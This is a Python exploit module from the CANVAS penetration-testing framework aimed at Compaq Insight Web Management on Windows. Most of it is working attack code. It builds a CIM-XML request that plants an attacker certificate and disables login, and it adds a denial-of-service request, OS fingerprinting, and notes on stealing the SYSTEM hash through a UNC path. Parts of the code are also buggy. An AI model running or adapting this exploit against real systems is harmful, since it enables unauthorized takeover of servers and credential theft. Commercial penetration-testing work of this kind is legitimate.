#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
Emulator for Compaq Insight
"""

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")


import socket
from exploitutils import *
from tcpexploit import tcpexploit
import time

from libs.notes import *

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Compaq"
DOCUMENTATION["Notes"]="This uses Compaq Web Management's lack of authentication checks to load a certificate into your target's trusted certificate store. You can then manage it from your Insight 7 console."
DOCUMENTATION[".exe"]="vcagent.exe"
DOCUMENTATION["FoundBy"]="Dave Aitel"
DOCUMENTATION["CVE Name"] = "Unknown"
DOCUMENTATION["CVE Url"] = "Unknown"

NAME="Insight"

DESCRIPTION="Compaq Insight CIM-XML exploit"
VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "NT", "2000", "XP", "2003" ]

NOTES="""
This is not the default setting, but is often set:
 Allow Anonymous users access to unsecured pages. Please note that this includes Local Anonymous Access.

Breakpoint on expat _load to see some XML action

When calling /Proxy/Debug we end up at an XML parser doing CIM-XML work. It
doesn't support the entire protocol, as it is represented in the CIM-XML
documentation on the web, but it does appear to do some basic routines. It
does this by loading the file on the disk (at cimom<number>.xml) and then
parsing it with expat. Haven't found any overflows here that require less than
a gig or so of traffic, which I would send if Apache would accept it, but I
don't think it does.

expat.GetValueChildNodeString looks for a node <VALUE>ASDF</VALUE> and returns ASDF.

This will do a bounce attack against it...it will only load valid certificates, but
you can steal the SYSTEM hash and proxy it against it...
You may need administrator (vcagent, not NT) to do this.

GET /proxy/XECert.htm?ViewCertFile=\\192.168.1.102\C\autoexec.bat HTTP/1.1
Host: 192.168.1.104:2381
User-Agent: Mozilla/5.0 Galeon/1.2.6 (X11; Linux i686; U;) Gecko/20020916
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1
Accept-Language: en
Accept-Encoding: gzip, deflate, compress;q=0.9
Accept-Charset: ISO-8859-1, utf-8;q=0.66, *;q=0.66
Keep-Alive: 300
Connection: keep-alive
Cookie: Compaq-HMMD=3ED3D1470293402362DB00012A22FECB0C8F1F4036A291951531C748; COMPAQ-CHP=autorefreshInterval:5
Referer: https://192.168.1.104:2381/cpqopts.htm?ResetToDefault


"""

CHANGELOG="""

"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=2301
        self.webagentport=2381
        self.host=""
        self.shellcode="\xcc" * 298
        #hmm, according to 60074207 we only compare with 0, 0d 0a 3f 26 20
        #self.searchbadstring="%.,:;\x00\x0a\x0d+\"\x2f\x5c\x09\x0e\x0b =&~("
        self.searchbadstring="%\x00\x0a\x0d&? "
        self.badstring=self.searchbadstring
        self.ssl=0
        self.setVersions()
        self.version=1
        self.name=NAME
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #pop pop return
        #self.versions[1]=("VirusScan Enterprise 7.0.0",0x21833b31)
        self.versions[1]=("Insight")
    
    def test(self):
        """
        Connect to the remote host and get the version from it, if possible
        We look for:
        HTTP/1.0 200 OK
        Date: Fri, 29 Aug 2003 18:47:51 Central Standard Time
        Server: Spipe/1.0
        MIME-version: 1.0
        Content-Type: text/html
        Content-Length: 1089233
        
        """
        self.host=self.target.interface
        self.port=self.argsDict.get("port",self.port)
        
        
        
        teststring="GET /Proxy/XEStatusReport HTTP/1.1\r\n"
        teststring+="Connection: keep-alive\r\n"
        teststring+="Date: Thu, 04 Sep 2003 19:18:20 GMT\r\n"
        teststring+="Accept: */*\r\n"
        teststring+="Host: 127.0.0.1:2301\r\n"
        teststring+="User-Agent: Jigsaw/2.0.5\r\n"
        teststring+="Compaq-WBEM-Flags: NoCookie\r\n"
        teststring+="\r\n"

        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            return 0
        self.websend(s,teststring)
        data=""
        data+=self.webrecv(s)
        data+=self.webrecv(s) 
        data+=self.webrecv(s) 
        self.log("Test for port %d recieved: %s"%(self.port,data))
        if data.count("CompaqHTTPServer"):
            compaq=1
        else:
            compaq=0
            
        teststring+="GET /WEBAGENT/FINDEX.TPL HTTP/1.1\r\n"
        teststring+="Host: localhost\r\n"
        teststring+="\r\n"
        #s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2=self.gettcpsock()
        s2=s2._sock
        s2.connect((self.host, self.webagentport))
        s2=socket.ssl(s2,None,None)
        s2.write(teststring)
        tmp="A"
        data=""
        while tmp!="":
            try:
                tmp=s2.read()
            except:
                break
            data+=tmp
        self.log("Webagent returned: %s"%data)
        
        
        teststring+="GET /Proxy/Debug HTTP/1.1\r\n"
        teststring+="Host: localhost\r\n"
        teststring+="\r\n"
        #s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2=self.gettcpsock()
        s2=s2._sock
        s2.connect((self.host, self.webagentport))
        s2=socket.ssl(s2,None,None)
        s2.write(teststring)
        tmp="A"
        data=""
        while tmp!="":
            try:
                tmp=s2.read()
            except:
                break
            data+=tmp
        self.log("Proxy/Debug returned: %s"%data)
        
        
        return compaq
    
    def run(self):

        self.host=self.target.interface
        self.port=self.argsDict.get("port",self.port)

        self.setInfo("%s Running"%self.name)
        
        if self.version==0:
            ret=self.test()
            return ret
        if self.version==2:
            self.osDetect()
            self.setInfo("%s Done"%self.name)
                        
            return 1
        if self.version==1:
            sploitstring=self.makesploit()
        elif self.version==3:
            sploitstring=self.makeDOS()
        else:
            self.log("Version %d not expected...returning"%self.version)
            self.setInfo("%s Done"%self.name)
            return 0
        
        data=""
        #do standard certificate attack
        try:
            
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s=self.gettcpsock()
            s.connect((self.host, self.webagentport))
            s=s._sock
            s=socket.ssl(s)
            self.ssl=1
            self.websend(s,sploitstring)
            tmp="A"
            data=""
            while tmp!="":
                try:
                    tmp=s.read()
                except:
                    break
                data+=tmp
            self.log("Returned: %s"%data[:5000])
        except:
            import traceback
            traceback.print_exc(file=sys.stdout)
            self.log("Attack reported no open socket - service died?")
        
        if data.count("toolong"):
            self.log("Server reported URL too long")
            
        self.setInfo("%s Done"%self.name)       
        return 1
    
    def makeSurveyRequest(self,request):
        self.host=self.target.interface
                
        self.log("Making survey request.")
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        versiongetstring="GET /Survey/Survey.Htm HTTP/1.0\r\n\r\n"
        try:
            s.connect((self.host, self.webagentport))
            s=s._sock
            s=socket.ssl(s)
            self.ssl=1
            self.websend(s,request)
        except:
            #import traceback
            #traceback.print_exc(file=sys.stdout)
            self.log("Error connecting to target...returning")
            return ""
        self.websend(s,versiongetstring)
        data=""
        data+=self.webrecv(s)
        #self.log("Received data from CWM: %s"%data)
        return data
        
    def osDetect(self):
        versiongetstring="GET /Survey/Survey.Htm HTTP/1.0\r\n\r\n"
        data=self.makeSurveyRequest(versiongetstring)
        if data:
            self.log("Received data from CWM: %s"%data)
        else:
            return ""
        
        keyloc=data.find("t=")
        if keyloc==-1:
            self.log("Couldn't find key! Returning.")
            return ""
        
        key=data[keyloc+2:keyloc+5]
        key=key.split("\"")[0]
        self.log("Key=%s"%key)
        cookieloc=data.find("Compaq-HMMD=")
        if cookieloc==-1:
            self.log("Couldn't find cookie!")
            return ""
        cookieloc+=len("Compaq-HMMD=")
        cookie=data[cookieloc:cookieloc+len("3EAEA5D200B340D9D0030001B5841837E1983A4CA9936D3658837538")]

        done=1
        while not done:
            time.sleep(1)
            getstring="GET /Survey/Progress.Htm?t=%s HTTP/1.0\r\n"%(key)
            getstring+="Cookie: Compaq-HMMD=%s\r\n"%cookie
            getstring+="\r\n"
            self.log("Sending %s"%getstring)
            data=self.makeSurveyRequest(getstring)
            self.log("Received data from CWM: %s"%data)
            if data.count("Output Session 10"):
                done=1

            cookieloc=data.find("Compaq-HMMD=")
            if cookieloc==-1:
                self.log("Couldn't find cookie!")
                return ""
            cookieloc+=len("Compaq-HMMD=")
            cookie=data[cookieloc:cookieloc+len("3EAEA5D200B340D9D0030001B5841837E1983A4CA9936D3658837538")]

        getstring="GET /Survey/IdxTree.Htm?t=%s HTTP/1.0\r\n"%key
        getstring+="Host: %s:2381\r\n"%self.host
        getstring+="Cookie: Compaq-HMMD=%s; COMPAQ-CHP=autorefreshInterval:5\r\n"%(cookie)
        getstring+="User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.5) Gecko/20031007\r\n"
        getstring+="Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1\r\n"
        getstring+="Connect: keep-alive\r\n"
        getstring+="Referer: https://%s:2381/survey\r\n"%self.host
        getstring+="Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
        getstring+="\r\n"
        self.log("Sending %s"%getstring)
        #data=self.makeSurveyRequest(getstring)
        #self.log("Data=%s"%data)
        
        
        cookieloc=data.find("Compaq-HMMD=")
        if cookieloc==-1:
            self.log("Couldn't find cookie!")
            return ""
        cookieloc+=len("Compaq-HMMD=")
        cookie=data[cookieloc:cookieloc+len("3EAEA5D200B340D9D0030001B5841837E1983A4CA9936D3658837538")]

        for i in range(0,2):
            getstring="GET /Survey/Survey.Htm?t=%s HTTP/1.1\r\n"%key
            getstring+="Host: %s:2381\r\n"%self.host
            getstring+="Cookie: Compaq-HMMD=%s; COMPAQ-CHP=autorefreshInterval:5\r\n"%(cookie)
            getstring+="User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.5) Gecko/20031007\r\n"
            getstring+="Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1\r\n"
            getstring+="Connect: keep-alive\r\n"
            getstring+="Referer: https://%s:2381/survey\r\n"%self.host
            getstring+="Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
            getstring+="\r\n"
            self.log("Sending %s"%getstring)
            data=self.makeSurveyRequest(getstring)

        osloc=data.find("Platform Name")
        data=data[osloc:]
        osloc=data.find("<b>")+3
        os=data[osloc:osloc+150].split("</b>")[0]
        osloc=data.find("(build")
        data=data[osloc+6:]
        os+=" build"+data[:10].split(")")[0]+" "

        osloc=data.find("Service Pack")
        data=data[osloc:]
        os+=data[:100].split("</font>")[0]+" "
        if data[:300].count("Uni"):
            os+="Uniprocessor"
        fname="%s_CWM.txt"%self.host
        try:
            fout=open(fname,"a+")
            fout.write(data)
            fout.close()
            self.log("All data from Compaq Web Management saved to %s"%fname)
        except:
            self.log("Some kind of error trying to save data in %s"%fname)
            
        self.log("OS=%s"%os)
        return os

    def makeDOS(self):
        ret=""
        ret+="GET /Proxy/Debug/?Url=%3C%21.ObjectIsapiECB%3E HTTP/1.1\r\n"
        ret+="Host: %s:%d"%(self.host,self.port)
        ret+="User-Agent: Mozilla/5.0 Galeon/1.2.6\r\n"
        ret+="Accept: text/xml\r\n"
        ret+="Referer: https://%s:%d/Proxy/Debug\r\n"%(self.host,self.port)
        ret+="\r\n"
                
    def makesploit(self):
        """
        Construct the attack
        URLS must be <= 210
        """
        sploitstring=""
        #args="<!.DebugMemoryHexDump=%s>"%("A"*325)
        #args="<!.%s>"%("StringWebHelpParams")
        #args="<!.%s>"%("/WEBAGENT/InstalledComponents"*1)
        #args="/"+"A"*65536
        #args=urllib.quote_plus(args)        
        #args="User=%s&Password=%s&confpassword=%s"%("%n"*10,"%n"*10,"%n"*1000)
        #Valid IMETHODCALLS are EnumerateInstances and ModifyInstance and AppyToAll
        #<?xml . . .> must be first line!
        oldargs="""<?xml version="1.0" encoding="UTF-8"?>
        
        <CIM DTDVERSION="1.0" CIMVERSION="1.0">
        <MESSAGE ID="82000" PROTOCOLVERSION="1.0">
        <SIMPLEREQ>
          <IMETHODCALL NAME="ApplyToAll">
            <LOCALNAMESPACEPATH>
              <NAMESPACE NAME="root"/>
              <NAMESPACE NAME="cimv2" />
            </LOCALNAMESPACEPATH>
            
            <IPARAMVALUE NAME="ClassName">
             <CLASSNAME NAME="cim_logicalport"/>
            </IPARAMVALUE>
          </IMETHODCALL>
          <PROPERTY NAME="Speed" TYPE="uint64">
          </PROPERTY>
         </SIMPLEREQ>
         </MESSAGE>
         </CIM>
          
         """
        args="""<?xml version="1.0" encoding="UTF-8"?>
        
        <CIM DTDVERSION="1.0" CIMVERSION="1.0">
        <MESSAGE ID="82000" PROTOCOLVERSION="1.0">
        <SIMPLEREQ>
          <IMETHODCALL NAME="ModifyInstance">
            <INSTANCE CLASSNAME="Cpq_Proxy">
            <PROPERTY>
            </PROPERTY>
            </INSTANCE>
            
            <LOCALNAMESPACEPATH>
              <NAMESPACE NAME="root"/>
              <NAMESPACE NAME="cimv2" />
            </LOCALNAMESPACEPATH>
            <IPARAMVALUE NAME="ClassName">
             <CLASSNAME NAME="cim_logicalport"/>
            </IPARAMVALUE>
          </IMETHODCALL>
          <PROPERTY NAME="Speed" TYPE="uint64">
          </PROPERTY>
         </SIMPLEREQ>
         </MESSAGE>
         </CIM>
          
        """
        
        #here we tickle the compaq proxy
        #it handles the user password set queries properly :<
        
        args="""<?xml version="1.0" encoding="UTF-8"?>
        
        <CIM DTDVERSION="1.0" CIMVERSION="1.0">
        <MESSAGE ID="82000" PROTOCOLVERSION="1.0">
        <SIMPLEREQ>
          <IMETHODCALL NAME="ModifyInstance">
            <INSTANCE CLASSNAME="Cpq_Proxy">
            <PROPERTY NAME="TrustMode">
            <VALUE>TrustByCert</VALUE>
            </PROPERTY>
            <PROPERTY NAME="XECert">
            <VALUE>"""
        #see 10083996 for this...
        certfile="servcert.cer"
        data=open(certfile,"rb").read()
        args+=urllib.quote(data)
                           
       
        args+="""</VALUE>
            </PROPERTY>
            <PROPERTY NAME="LoginRequired">
            <VALUE>no</VALUE>
            </PROPERTY>
            """
        args+="""
            </INSTANCE>
            <LOCALNAMESPACEPATH>

              <NAMESPACE NAME="roota"/>
              <NAMESPACE NAME="cimv2" />
            </LOCALNAMESPACEPATH>

            <IPARAMVALUE NAME="ClassName">
             <CLASSNAME NAME="cim_logicalport"/>
            </IPARAMVALUE>
          </IMETHODCALL>
          <PROPERTY NAME="Speed" TYPE="uint64">
          </PROPERTY>
         </SIMPLEREQ>
         </MESSAGE>
         </CIM>
          
        """
           
        #sploitstring+="GET /Proxy/Debug?Url=%s HTTP/1.1\r\n"%args
        #sploitstring+="GET /Proxy/Purge?Extension=%s HTTP/1.1\r\n"%args
        #sploitstring+="GET /%s HTTP/1.1\r\n"%args
        sploitstring+="POST /Proxy/cimom HTTP/1.1\r\n" #access violation?
        #Wtf is /proxy/getkey returning? Some long number?
        #sploitstring+="POST /Proxy/TranslateTag%s HTTP/1.1\r\n"%("%25n"*50)
        #sploitstring+="POST /Proxy/Registration HTTP/1.1\r\n"
        #sploitstring+="POST /Proxy/SSLPwdChange HTTP/1.1\r\n"
        sploitstring+="Host: localhost:2381\r\n"
        sploitstring+="Content-Type: application/xml\r\n"
        sploitstring+="48-CIMProtocolVersion: 1.0\r\n"
        sploitstring+="48-CIMOperation: MethodCall\r\n"
        sploitstring+="48-CIMMethod: GetClass\r\n"
        sploitstring+="48-CIMObject: root%2fcimv2\r\n"
        #sploitstring+="Cookie: /%s\r\n"%("A"*65536)
        sploitstring+="Content-Length: %d\r\n"%len(args)
        sploitstring+="\r\n"
        sploitstring+=args        
        return sploitstring

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)

